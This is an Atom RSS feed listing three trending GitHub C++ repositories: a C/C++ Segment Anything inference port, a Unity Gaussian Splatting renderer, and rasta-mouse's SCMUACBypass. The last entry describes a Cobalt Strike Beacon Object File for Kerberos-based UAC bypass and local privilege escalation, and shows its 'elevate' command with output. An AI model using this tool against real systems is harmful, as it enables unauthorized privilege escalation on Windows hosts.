<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-08T01:24:39Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>YavorGIvanov/sam.cpp</title>
    <updated>2023-09-08T01:24:39Z</updated>
    <id>tag:github.com,2023-09-08:/YavorGIvanov/sam.cpp</id>
    <link href="https://github.com/YavorGIvanov/sam.cpp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SAM.cpp&lt;/h1&gt; &#xA;&lt;p&gt;Inference of Meta&#39;s &lt;a href=&#34;https://github.com/facebookresearch/segment-anything/&#34;&gt;Segment Anything Model&lt;/a&gt; in pure C/C++&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/YavorGIvanov/sam.cpp/assets/1991296/a69be66f-8e27-43a0-8a4d-6cfe3b1d9335&#34;&gt;https://github.com/YavorGIvanov/sam.cpp/assets/1991296/a69be66f-8e27-43a0-8a4d-6cfe3b1d9335&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quick start&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone --recursive https://github.com/YavorGIvanov/sam.cpp&#xA;cd sam.cpp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: you need to download the model checkpoint below (&lt;code&gt;sam_vit_b_01ec64.pth&lt;/code&gt;) first from &lt;a href=&#34;https://dl.fbaipublicfiles.com/segment_anything/sam_vit_b_01ec64.pth&#34;&gt;here&lt;/a&gt; and place it in the &lt;code&gt;checkpoints&lt;/code&gt; folder&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Convert PTH model to ggml. Requires python3, torch and numpy&#xA;python convert-pth-to-ggml.py checkpoints/sam_vit_b_01ec64.pth . 1&#xA;&#xA;# You need CMake and SDL2&#xA;SDL2 - Used for GUI windows &amp;amp; input [libsdl](https://www.libsdl.org)&#xA;&#xA;[Ubuntu]&#xA;$ sudo apt install libsdl2-dev&#xA;&#xA;[Mac OS with brew]&#xA;$ brew install sdl2&#xA;&#xA;[MSYS2]&#xA;$ pacman -S git cmake make mingw-w64-x86_64-dlfcn mingw-w64-x86_64-gcc mingw-w64-x86_64-SDL2&#xA;&#xA;# Build sam.cpp.&#xA;mkdir build &amp;amp;&amp;amp; cd build&#xA;cmake .. &amp;amp;&amp;amp; make -j4&#xA;&#xA;# run inference&#xA;./bin/sam -t 16 -i ../img.jpg -m ../checkpoints/ggml-model-f16.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: The optimal threads parameter (&#34;-t&#34;) value should be manually selected based on the specific machine running the inference.&lt;/p&gt; &#xA;&lt;h2&gt;Downloading and converting the model checkpoints&lt;/h2&gt; &#xA;&lt;p&gt;You can download a &lt;a href=&#34;https://github.com/facebookresearch/segment-anything/tree/main#model-checkpoints&#34;&gt;model checkpoint&lt;/a&gt; and convert it to &lt;code&gt;ggml&lt;/code&gt; format using the script &lt;code&gt;convert-pth-to-ggml.py&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Convert PTH model to ggml&#xA;python convert-pth-to-ggml.py sam_vit_b_01ec64.pth . 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Example output on M2 Ultra&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt; $ ▶ make -j sam &amp;amp;&amp;amp; time ./bin/sam -t 8 -i img.jpg&#xA;[ 28%] Built target common&#xA;[ 71%] Built target ggml&#xA;[100%] Built target sam&#xA;main: seed = 1693224265&#xA;main: loaded image &#39;img.jpg&#39; (680 x 453)&#xA;sam_image_preprocess: scale = 0.664062&#xA;main: preprocessed image (1024 x 1024)&#xA;sam_model_load: loading model from &#39;models/sam-vit-b/ggml-model-f16.bin&#39; - please wait ...&#xA;sam_model_load: n_enc_state      = 768&#xA;sam_model_load: n_enc_layer      = 12&#xA;sam_model_load: n_enc_head       = 12&#xA;sam_model_load: n_enc_out_chans  = 256&#xA;sam_model_load: n_pt_embd        = 4&#xA;sam_model_load: ftype            = 1&#xA;sam_model_load: qntvr            = 0&#xA;operator(): ggml ctx size = 202.32 MB&#xA;sam_model_load: ...................................... done&#xA;sam_model_load: model size =   185.05 MB / num tensors = 304&#xA;embd_img&#xA;dims: 64 64 256 1 f32&#xA;First &amp;amp; Last 10 elements:&#xA;-0.05117 -0.06408 -0.07154 -0.06991 -0.07212 -0.07690 -0.07508 -0.07281 -0.07383 -0.06779&#xA;0.01589 0.01775 0.02250 0.01675 0.01766 0.01661 0.01811 0.02051 0.02103 0.03382&#xA;sum:  12736.272313&#xA;&#xA;Skipping mask 0 with iou 0.705935 below threshold 0.880000&#xA;Skipping mask 1 with iou 0.762136 below threshold 0.880000&#xA;Mask 2: iou = 0.947081, stability_score = 0.955437, bbox (371, 436), (144, 168)&#xA;&#xA;&#xA;main:     load time =    51.28 ms&#xA;main:    total time =  2047.49 ms&#xA;&#xA;real&#x9;0m2.068s&#xA;user&#x9;0m16.343s&#xA;sys&#x9;0m0.214s&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Input point is (414.375, 162.796875) (currently hardcoded)&lt;/p&gt; &#xA;&lt;p&gt;Input image:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/8558655/261301565-37b7bf4b-bf91-40cf-8ec1-1532316e1612.jpg&#34; alt=&#34;llamas&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Output mask (mask_out_2.png in build folder):&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/8558655/265732931-e7e31285-7efc-4009-98c8-57fd819bdfc1.png&#34; alt=&#34;mask_glasses&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ggerganov/ggml&#34;&gt;ggml&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ggerganov/ggml/tree/master/examples/sam&#34;&gt;ggml SAM example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://segment-anything.com/&#34;&gt;SAM&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://segment-anything.com/demo&#34;&gt;SAM demo&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Next steps&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Reduce memory usage by utilizing the new ggml-alloc&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Remove redundant graph nodes&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Make inference faster&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Fix the difference in output masks compared to the PyTorch implementation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Filter masks based on stability score&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add support for point user input&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Support F16 for heavy F32 ops&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Test quantization&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Support bigger model checkpoints&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; GPU support&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Add support for mask and box input&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>aras-p/UnityGaussianSplatting</title>
    <updated>2023-09-08T01:24:39Z</updated>
    <id>tag:github.com,2023-09-08:/aras-p/UnityGaussianSplatting</id>
    <link href="https://github.com/aras-p/UnityGaussianSplatting" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Toy Gaussian Splatting visualization in Unity&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Toy Gaussian Splatting playground in Unity&lt;/h1&gt; &#xA;&lt;p&gt;SIGGRAPH 2023 had a paper &#34;&lt;a href=&#34;https://repo-sam.inria.fr/fungraph/3d-gaussian-splatting/&#34;&gt;&lt;strong&gt;3D Gaussian Splatting for Real-Time Radiance Field Rendering&lt;/strong&gt;&lt;/a&gt;&#34; by Kerbl, Kopanas, Leimkühler, Drettakis that looks pretty cool! Check out their website, source code repository, data sets and so on.&lt;/p&gt; &#xA;&lt;p&gt;I&#39;ve decided to try to implement the realtime visualization part (i.e. the one that takes already-produced gaussian splat &#34;model&#34; file) in Unity.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/aras-p/UnityGaussianSplatting/main/Screenshot01.png?raw=true&#34; alt=&#34;Screenshot&#34; title=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The original paper code has a purely CUDA-based realtime renderer; other people have done their own implementations (e.g. WebGPU at &lt;a href=&#34;https://github.com/cvlab-epfl/gaussian-splatting-web&#34;&gt;cvlab-epfl&lt;/a&gt;, Taichi at &lt;a href=&#34;https://github.com/wanmeihuali/taichi_3d_gaussian_splatting&#34;&gt;wanmeihuali&lt;/a&gt;, etc.).&lt;/p&gt; &#xA;&lt;p&gt;Code in here so far is randomly cribbled together from reading the paper (as well as earlier literature on EWA splatting), looking at the official CUDA implementation, and so on. Current state:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The code does &lt;strong&gt;not&lt;/strong&gt; use the &#34;tile-based splat rasterizer&#34; bit from the paper; it just draws each gaussian splat as a screenspace aligned rectangle that covers the extents of it.&lt;/li&gt; &#xA; &lt;li&gt;Splat color accumulation is done by rendering front-to-back, with a blending mode that results in the same accumulated color as their tile-based renderer.&lt;/li&gt; &#xA; &lt;li&gt;Splat sorting is done with a AMD FidelityFX derived radix sort, or (on DX11) with a GPU bitonic sort that is lifted from Unity HDRP codebase.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This is not a fast implementation yet!&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Within Unity (2022.3), there&#39;s a &lt;code&gt;Scene.unity&lt;/code&gt; that has a &lt;code&gt;GaussianSplatRenderer&lt;/code&gt; script attached to it. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The project defaults to DX12 on Windows, since then it can use a faster GPU sorting routine. DX11 should also work, at expense of performance.&lt;/li&gt; &#xA;   &lt;li&gt;Metal and Vulkan also use the faster sorting approach.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;You need to point it to a &#34;model&#34; directory. The model directory is expected to contain &lt;code&gt;cameras.json&lt;/code&gt; and &lt;code&gt;point_cloud/iteration_7000/point_cloud.ply&lt;/code&gt; inside of it. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Since the models are quite large, I have not included any in this Github repo. The original &lt;a href=&#34;https://github.com/graphdeco-inria/gaussian-splatting&#34;&gt;paper github page&lt;/a&gt; has a a link to &lt;a href=&#34;https://repo-sam.inria.fr/fungraph/3d-gaussian-splatting/datasets/pretrained/models.zip&#34;&gt;14GB zip&lt;/a&gt; of their models.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Press play. The gaussian splat renderer component inspector will have a slider to move the game view camera into one of the cameras from the model directory. Or you can just move the game/scene view camera however you please.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; Note: this is all &lt;em&gt;&lt;strong&gt;a toy&lt;/strong&gt;&lt;/em&gt;, it is not robust, it does not handle errors gracefully, it does not interact or composite well with the &#34;rest of rendering&#34;, it is not fast, etc. etc. I told you so!&lt;/p&gt; &#xA;&lt;p&gt;Wishlist that I may or might not do at some point:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Make rendering faster (actual tiled compute shader rasterizer)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Look at ways to make the data sets smaller (both on-disk and in-memory)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Integrate better with &#34;the rest&#34; of rendering that might be in the scene&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Make sorting faster (bitonic -&amp;gt; FidelityFX radix sort)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Write-ups&lt;/h2&gt; &#xA;&lt;p&gt;My own blog posts about all this &lt;em&gt;(so far... not that many!)&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://aras-p.info/blog/2023/09/05/Gaussian-Splatting-is-pretty-cool/&#34;&gt;Gaussian Splatting is pretty cool!&lt;/a&gt; (2023 Sep)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Performance numbers:&lt;/h2&gt; &#xA;&lt;p&gt;&#34;bicycle&#34; scene from the paper, with 6.1M splats and first camera in there, rendering at 1200x800 resolution:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows (NVIDIA RTX 3080 Ti): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Official SBIR viewer: 7.4ms (135FPS). 4.8GB VRAM usage.&lt;/li&gt; &#xA;   &lt;li&gt;Unity, DX12 or Vulkan: 13.4ms (75FPS) - 10.1ms rendering, 3.3ms sorting. 2.1GB VRAM usage.&lt;/li&gt; &#xA;   &lt;li&gt;Unity, DX11: 21.8ms (46FPS) - 9.9ms rendering, 11.9ms sorting.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Mac (Apple M1 Max): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Unity, Metal: 80.6ms (12FPS) - with FidelityFX GPU sort.&lt;/li&gt; &#xA;   &lt;li&gt;Unity, Metal: 108ms (9FPS) - with bitonic GPU sort.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;External Code Used&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/zanders3/json&#34;&gt;zanders3/json&lt;/a&gt;, MIT license, (c) 2018 Alex Parker.&lt;/li&gt; &#xA; &lt;li&gt;&#34;Island&#34; GPU sorting code adapted from &lt;a href=&#34;https://poniesandlight.co.uk/reflect/bitonic_merge_sort/&#34;&gt;Tim Gfrerer blog post&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&#34;Ffx&#34; GPU sorting code is &lt;a href=&#34;https://github.com/GPUOpen-Effects/FidelityFX-ParallelSort&#34;&gt;AMD FidelityFX ParallelSort&lt;/a&gt;, ported to Unity by me.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>rasta-mouse/SCMUACBypass</title>
    <updated>2023-09-08T01:24:39Z</updated>
    <id>tag:github.com,2023-09-08:/rasta-mouse/SCMUACBypass</id>
    <link href="https://github.com/rasta-mouse/SCMUACBypass" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SCMUACBypass&lt;/h1&gt; &#xA;&lt;p&gt;A BOF which authenticates to the Service Control Manager via Kerberos and LPEs using a service binary payload. This is designed to be used in combination with Kerberos relay attack primitives - the appropriate ticket(s) must already be in your cache.&lt;/p&gt; &#xA;&lt;p&gt;The included Aggressor script registers a new &lt;code&gt;elevate&lt;/code&gt; command in Beacon.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;beacon&amp;gt; elevate svc-exe-krb tcp-local&#xA;&#xA;AcquireCredentialsHandleHook called for package Negotiate&#xA;Changing to Kerberos package&#xA;&#xA;InitializeSecurityContext called for target HOST/127.0.0.1&#xA;InitializeSecurityContext status = 00090312&#xA;&#xA;InitializeSecurityContext called for target HOST/127.0.0.1&#xA;InitializeSecurityContext status = 00000000&#xA;&#xA;[+] established link to child beacon: 172.16.0.100&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/rasta-mouse/SCMUACBypass/main/beacon.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;References&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>